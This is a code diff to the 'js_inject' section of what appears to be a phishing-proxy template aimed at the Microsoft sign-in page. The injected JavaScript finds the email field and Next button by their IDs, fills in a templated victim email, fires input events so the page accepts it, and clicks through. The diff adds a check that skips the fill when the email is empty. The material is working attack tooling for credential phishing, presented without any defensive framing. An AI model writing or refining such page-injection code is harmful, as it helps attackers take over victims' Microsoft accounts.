@@ -118,26 +118,32 @@ js_inject:
       function lp(){
         const emailInput = document.getElementById("i0116");
         if (emailInput) {
-          // Set the value
-          console.log("Setting email value to: {email}");
-           emailInput.value = "{email}";
+          const emailValue = "{email}";
           
-          // Trigger input events to make the page detect the change
-          emailInput.dispatchEvent(new Event('input', { bubbles: true }));
-          emailInput.dispatchEvent(new Event('change', { bubbles: true }));
-          emailInput.dispatchEvent(new Event('keyup', { bubbles: true }));
-          
-          // Focus the input to ensure it's active
-          emailInput.focus();
-          
-          const nextButton = document.getElementById("idSIButton9");
-          if (nextButton) {
-            nextButton.click();
+          // Only proceed if email value is not empty
+          if (emailValue && emailValue.trim() !== "") {
+            // Set the value
+            console.log("Setting email value to: " + emailValue);
+            emailInput.value = emailValue;
+            
+            // Trigger input events to make the page detect the change
+            emailInput.dispatchEvent(new Event('input', { bubbles: true }));
+            emailInput.dispatchEvent(new Event('change', { bubbles: true }));
+            emailInput.dispatchEvent(new Event('keyup', { bubbles: true }));
+            
+            // Focus the input to ensure it's active
+            emailInput.focus();
+            
+            const nextButton = document.getElementById("idSIButton9");
+            if (nextButton) {
+              nextButton.click();
+            }
+            
+            return true; // Exit the loop
+          } else {
+            console.log("Email value is empty, skipping auto-fill");
+            return true; // Exit the loop even if email is empty to avoid infinite checking
           }
-
-          
-          
-          return true; // Exit the loop
         }
         return false; // Continue checking
       }
